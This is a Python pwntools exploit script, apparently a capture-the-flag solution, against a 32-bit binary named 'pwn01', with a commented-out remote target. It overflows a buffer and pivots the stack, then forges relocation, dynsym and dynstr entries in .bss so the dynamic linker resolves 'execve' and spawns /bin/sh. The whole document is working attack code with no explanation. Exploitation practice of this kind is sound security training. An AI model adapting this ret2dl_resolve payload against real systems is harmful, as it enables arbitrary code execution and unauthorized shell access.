#!/usr/bin/env python
# coding=utf-8
from pwn import*
context.terminal=["tmux","splitw","-h"]
a=process("./pwn01")
#a=remote("39.100.87.24","8101")
elf=ELF("./pwn01")
def debug():
    gdb.attach(a,'''
    b *0x80484B4
    b *0x8048519
    ''')
read_plt=elf.plt["read"]
rel_plt_addr=0x80482b4
dynsym_addr=0x80481cc
dynstr_addr=0x804822c
plt0_addr=0x80482f0
bss_addr=0x804A040+0x2000

fake_rel_plt_addr=bss_addr

arg_offset=fake_rel_plt_addr - rel_plt_addr#dl_reslove(linkmap,arg_offset)

fake_dynsym_addr=fake_rel_plt_addr + 0x8   #fake_dynsym address

align=16-(fake_dynsym_addr-dynsym_addr)%16  #align
fake_dynsym_addr+=align                 

r_info=(((fake_dynsym_addr-dynsym_addr)/16)<<8)|0x7 #rel_plt's r_info

fake_dynstr_addr=fake_dynsym_addr+16   
sh_addr=fake_dynstr_addr + 7
offset=fake_dynstr_addr-dynstr_addr
payload='A'*10+'\x01'*4
payload+=p32(0x804A040+14+4+4+0x1000) #saved ecx
payload+='A'*0x1000
payload+=p32(read_plt)
payload+=p32(0x08048519)#pop3_ret
payload+=p32(0)
payload+=p32(bss_addr)
payload+=p32(0x200)
payload+=p32(plt0_addr)
payload+=p32(arg_offset)
payload+=p32(plt0_addr)#ret addr
payload+=p32(sh_addr)
payload+=p32(0)
payload+=p32(0)
payload+=p32(0)
a.send(payload)
pause()
payload=p32(elf.got["read"])#fake_rel_plt
payload+=p32(r_info)
payload+='A'*align     #padding
payload+=p32(offset)+p32(0)+p32(0)+p32(0x12) #fake dynsym
payload+="execve\x00" #fake dynstr
payload+="/bin/sh\x00"
a.sendline(payload)
a.interactive()
